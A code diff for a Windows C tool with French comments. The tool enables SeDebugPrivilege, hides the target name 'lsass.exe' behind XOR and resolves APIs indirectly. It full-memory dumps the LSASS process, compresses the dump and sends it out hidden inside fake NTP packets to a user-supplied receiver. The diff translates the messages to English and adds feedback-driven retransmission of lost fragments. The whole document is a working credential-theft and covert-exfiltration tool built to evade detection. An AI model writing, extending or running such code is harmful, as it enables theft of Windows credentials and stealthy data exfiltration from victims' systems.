@@ -14,18 +14,13 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "DbgHelp.lib")
 
-
-// --- Activation du privilège SeDebugPrivilege ---
-// --- Activation du privilège SeDebugPrivilege via appels indirects ---
+// Activation du privilège SeDebugPrivilege
 BOOL EnableDebugPrivilege(void) {
-    // Chargement de advapi32.dll
     HMODULE hAdvapi = GetModuleHandleW(L"advapi32.dll");
     if (!hAdvapi) {
-        printf("[!] Échec de chargement de advapi32.dll.\n");
+        printf("[!] Failed to load advapi32.dll.\n");
         return FALSE;
     }
-
-    // Définition des pointeurs vers les fonctions nécessaires
     typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
     typedef BOOL (WINAPI *pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
     typedef BOOL (WINAPI *pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
@@ -35,7 +30,7 @@ BOOL EnableDebugPrivilege(void) {
     pAdjustTokenPrivileges fAdjustTokenPrivileges = (pAdjustTokenPrivileges)GetProcAddress(hAdvapi, "AdjustTokenPrivileges");
 
     if (!fOpenProcessToken || !fLookupPrivilegeValueW || !fAdjustTokenPrivileges) {
-        printf("[!] Échec de récupération d'une ou plusieurs fonctions depuis advapi32.dll.\n");
+        printf("[!] Failed to retrieve one or more functions from advapi32.dll.\n");
         return FALSE;
     }
 
@@ -44,11 +39,11 @@ BOOL EnableDebugPrivilege(void) {
     LUID luid;
 
     if (!fOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        printf("[!] OpenProcessToken a échoué.\n");
+        printf("[!] OpenProcessToken failed.\n");
         return FALSE;
     }
     if (!fLookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
-        printf("[!] LookupPrivilegeValue a échoué.\n");
+        printf("[!] LookupPrivilegeValue failed.\n");
         CloseHandle(hToken);
         return FALSE;
     }
@@ -56,12 +51,12 @@ BOOL EnableDebugPrivilege(void) {
     tp.Privileges[0].Luid = luid;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     if (!fAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
-        printf("[!] AdjustTokenPrivileges a échoué.\n");
+        printf("[!] AdjustTokenPrivileges failed.\n");
         CloseHandle(hToken);
         return FALSE;
     }
     if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
-        printf("[!] Le token ne possède pas le privilège requis.\n");
+        printf("[!] The token does not have the required privilege.\n");
         CloseHandle(hToken);
         return FALSE;
     }
@@ -69,9 +64,7 @@ BOOL EnableDebugPrivilege(void) {
     return TRUE;
 }
 
-
-// --- Fonction de conversion ---
-// --- Convertit une chaîne de caractères ANSI (char*) en Unicode (wchar_t*). ---
+// Fonction de conversion (convertit une chaîne ANSI en Unicode)
 wchar_t* ConvertToWideChar(const char* charStr) {
     int sizeNeeded = MultiByteToWideChar(CP_ACP, 0, charStr, -1, NULL, 0);
     wchar_t* wStr = (wchar_t*)malloc(sizeNeeded * sizeof(wchar_t));
@@ -81,8 +74,7 @@ wchar_t* ConvertToWideChar(const char* charStr) {
     return wStr;
 }
 
-// --- Fonction de déobfuscation ---
-// Décodage d'une chaîne obfusquée (chaque caractère XOR avec la clé)
+// Fonction de déobfuscation (décodage d'une chaîne obfusquée par XOR)
 void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
     size_t i = 0;
     while (encoded[i] != L'\0' && i < maxLen - 1) {
@@ -92,8 +84,7 @@ void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxL
     decoded[i] = L'\0';
 }
 
-// --- Fonction pour récupérer le PID d'un processus ---
-// Utilise les fonctions indirectes : CreateToolhelp32Snapshot, Process32FirstW, Process32NextW et CloseHandle
+// Fonction pour obtenir le PID d'un processus cible
 DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     DWORD pid = 0;
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
@@ -117,12 +108,10 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     if (hSnapshot == INVALID_HANDLE_VALUE)
         return 0;
 
-    // Utilisation de PROCESSENTRY32W pour travailler avec des chaînes de caractères larges (wchar_t*)
     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(PROCESSENTRY32W);
     if (fProcess32FirstW(hSnapshot, &pe)) {
         do {
-            // Comparaison de chaînes larges avec _wcsicmp
             if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
                 pid = pe.th32ProcessID;
                 break;
@@ -133,12 +122,8 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     return pid;
 }
 
-
-// --- Fonction de dump mémoire ---
-// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump (appel indirect déjà présent)
-// et un mapping mémoire temporaire en passant par les appels indirects de kernel32.dll
+// Fonction pour effectuer un dump mémoire du processus cible
 BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
-    // Chargement de DbgHelp.dll et récupération de MiniDumpWriteDump
     HMODULE hDbgHelp = LoadLibraryW(L"DbgHelp.dll");
     if (!hDbgHelp)
         return FALSE;
@@ -151,14 +136,12 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    // Ouvre le processus cible
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
     if (!hProcess) {
         FreeLibrary(hDbgHelp);
         return FALSE;
     }
 
-    // Création d'un fichier temporaire pour stocker le dump
     char tempPath[MAX_PATH];
     if (!GetTempPathA(MAX_PATH, tempPath)) {
         CloseHandle(hProcess);
@@ -174,7 +157,6 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    // Écriture du dump dans le fichier temporaire
     BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
     if (!success) {
         CloseHandle(hFile);
@@ -184,7 +166,6 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    // Récupération de la taille réelle du dump
     LARGE_INTEGER liSize;
     if (!GetFileSizeEx(hFile, &liSize)) {
         CloseHandle(hFile);
@@ -195,7 +176,6 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     }
     *dumpSize = (size_t)liSize.QuadPart;
 
-    // Allocation d'un buffer de la taille réelle du dump
     *dumpBuffer = (char*)malloc(*dumpSize);
     if (!*dumpBuffer) {
         CloseHandle(hFile);
@@ -205,7 +185,6 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    // Remise du pointeur de fichier au début et lecture du dump dans le buffer
     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
     DWORD bytesRead = 0;
     if (!ReadFile(hFile, *dumpBuffer, (DWORD)*dumpSize, &bytesRead, NULL) || bytesRead != *dumpSize) {
@@ -218,7 +197,6 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    // Nettoyage
     CloseHandle(hFile);
     CloseHandle(hProcess);
     FreeLibrary(hDbgHelp);
@@ -226,9 +204,7 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     return TRUE;
 }
 
-
-// --- Fonction de compression ---
-// Compresse le buffer à l'aide de zlib (ici, l'appel reste direct car zlib n'est pas une API Windows)
+// Fonction de compression du dump
 int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
     uLong bound = compressBound(inputSize);
     *compressedBuffer = (char*)malloc(bound);
@@ -243,15 +219,14 @@ int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedB
     return res;
 }
 
-// --- Fonctions pour la création et l'envoi de faux paquets NTP ---
-// Crée un paquet NTP de 48 octets avec le payload placé à l'offset 40
+// Fonction pour créer un paquet NTP
 void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
     memset(packet, 0, 48);
     packet[0] = 0x1B; // LI=0, VN=3, Mode=3
     memcpy(packet + 40, payload, 8);
 }
 
-// Envoie un paquet UDP contenant le faux paquet NTP en utilisant les fonctions indirectes de ws2_32.dll
+// Fonction pour envoyer un paquet NTP
 int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
     HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
     if (!hWs2_32)
@@ -273,7 +248,6 @@ int SendNTPPacket(const char *target_ip, int target_port, const unsigned char pa
 
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
-    int result = 0;
     if (fWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
         return -1;
     sock = fSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -289,20 +263,17 @@ int SendNTPPacket(const char *target_ip, int target_port, const unsigned char pa
 
     unsigned char packet[48];
     CreateNTPPacket(payload, packet);
-    result = fSendTo(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
+    int result = fSendTo(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
     fClosesocket(sock);
     fWSACleanup();
     return result;
 }
 
-// --- Envoi du dump compressé sous forme de paquets NTP fragmentés ---
-// Le premier paquet est un header de 8 octets (4 octets : nombre total de paquets, 4 octets : taille totale)
-// Chaque paquet de données contient 8 octets : 4 octets de numéro de séquence et 4 octets de fragment de données.
+// Fonction pour envoyer le dump compressé sous forme de paquets NTP fragmentés
 int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize) {
     const int fragment_size = 4;
     int total_fragments = (int)((compressedSize + fragment_size - 1) / fragment_size);
 
-    // Prépare le paquet header
     unsigned char header[8];
     header[0] = (total_fragments >> 24) & 0xFF;
     header[1] = (total_fragments >> 16) & 0xFF;
@@ -317,9 +288,8 @@ int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *
         printf("[!] Failed to send header packet.\n");
         return -1;
     }
-    printf("[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressedSize);
+    printf("[+] Header sent: %d fragments, %zu total bytes.\n", total_fragments, compressedSize);
 
-    // Envoi des paquets de données
     for (int seq = 0; seq < total_fragments; seq++) {
         unsigned char payload[8];
         payload[0] = (seq >> 24) & 0xFF;
@@ -338,18 +308,73 @@ int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *
         }
         printf("[+] Packet %d/%d sent.\n", seq + 1, total_fragments);
     }
-    printf("[+] Transmission completed.\n");
-    return 0;
+    printf("[+] Initial transmission completed.\n");
+    return total_fragments;
+}
+
+// Fonction de traitement des retransmissions
+#define FEEDBACK_PORT 124
+#define FEEDBACK_TIMEOUT 10000  // en millisecondes
+
+void ProcessRetransmissions(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize, int total_fragments) {
+    SOCKET fbSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (fbSock == INVALID_SOCKET) {
+        printf("[!] Failed to create feedback socket.\n");
+        return;
+    }
+    struct sockaddr_in localAddr;
+    memset(&localAddr, 0, sizeof(localAddr));
+    localAddr.sin_family = AF_INET;
+    localAddr.sin_addr.s_addr = INADDR_ANY;
+    localAddr.sin_port = htons(FEEDBACK_PORT);
+    if (bind(fbSock, (struct sockaddr*)&localAddr, sizeof(localAddr)) == SOCKET_ERROR) {
+        printf("[!] Failed to bind feedback socket.\n");
+        closesocket(fbSock);
+        return;
+    }
+    int timeout = FEEDBACK_TIMEOUT;
+    setsockopt(fbSock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+
+    char fbBuffer[1024];
+    struct sockaddr_in senderAddr;
+    int addrLen = sizeof(senderAddr);
+    int recvLen = recvfrom(fbSock, fbBuffer, sizeof(fbBuffer), 0, (struct sockaddr*)&senderAddr, &addrLen);
+    if (recvLen > 0) {
+        int numMissing = (fbBuffer[0] << 24) | (fbBuffer[1] << 16) | (fbBuffer[2] << 8) | fbBuffer[3];
+        printf("[*] Feedback received: %d missing fragments.\n", numMissing);
+        for (int i = 0; i < numMissing; i++) {
+            int offset = 4 + i * 4;
+            int seq = (fbBuffer[offset] << 24) | (fbBuffer[offset+1] << 16) | (fbBuffer[offset+2] << 8) | fbBuffer[offset+3];
+            unsigned char payload[8];
+            payload[0] = (seq >> 24) & 0xFF;
+            payload[1] = (seq >> 16) & 0xFF;
+            payload[2] = (seq >> 8) & 0xFF;
+            payload[3] = seq & 0xFF;
+            int fragment_size = 4;
+            int data_offset = seq * fragment_size;
+            int remaining = (int)compressedSize - data_offset;
+            int copySize = remaining < fragment_size ? remaining : fragment_size;
+            memset(payload + 4, 0, 4);
+            if (copySize > 0)
+                memcpy(payload + 4, compressedData + data_offset, copySize);
+            if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
+                printf("[!] Failed to retransmit packet %d.\n", seq);
+            } else {
+                printf("[+] Packet %d retransmitted.\n", seq);
+            }
+        }
+    } else {
+        printf("[!] No feedback received within timeout period.\n");
+    }
+    closesocket(fbSock);
 }
 
 int main(void) {
-
-    // Activation de SeDebugPrivilege
     if (!EnableDebugPrivilege()) {
-        printf("[!] Activation of SeDebugPrivilege failed.\n");
+        printf("[!] Failed to enable SeDebugPrivilege.\n");
         return 1;
     }
-    
+
     // Obfuscation de "lsass.exe" (chaque caractère XOR avec 0x13)
     wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
                                   's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
@@ -362,18 +387,18 @@ int main(void) {
     int target_port;
     printf("[*] Enter receiver IP: ");
     if (scanf("%63s", target_ip) != 1) {
-        printf("[!] Failed to read IP.\n");
+        printf("[!] Failed to read receiver IP.\n");
         return 1;
     }
     printf("[*] Enter receiver port: ");
     if (scanf("%d", &target_port) != 1) {
-        printf("[!] Failed to read port.\n");
+        printf("[!] Failed to read receiver port.\n");
         return 1;
     }
 
     DWORD pid = GetTargetProcessPID(targetProcessName);
     if (pid == 0) {
-        printf("[!] Process not found.\n");
+        printf("[!] Target process not found.\n");
         return 1;
     }
     wprintf(L"[+] Process %s found with PID %lu\n", targetProcessName, pid);
@@ -396,11 +421,21 @@ int main(void) {
     }
     printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);
 
-    if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
+    // Calcul du nombre total de fragments
+    const int fragment_size = 4;
+    int total_fragments = (int)((compressedSize + fragment_size - 1) / fragment_size);
+
+    int sendRes = SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize);
+    if (sendRes == -1) {
         printf("[!] Failed to send compressed dump to receiver.\n");
         free(compressedBuffer);
         return 1;
     }
+    printf("[+] Initial transmission completed.\n");
+
+    // Traitement des retransmissions basé sur le feedback du récepteur
+    ProcessRetransmissions(target_ip, target_port, compressedBuffer, compressedSize, total_fragments);
+
     free(compressedBuffer);
     printf("[+] Done!\n");
     return 0;
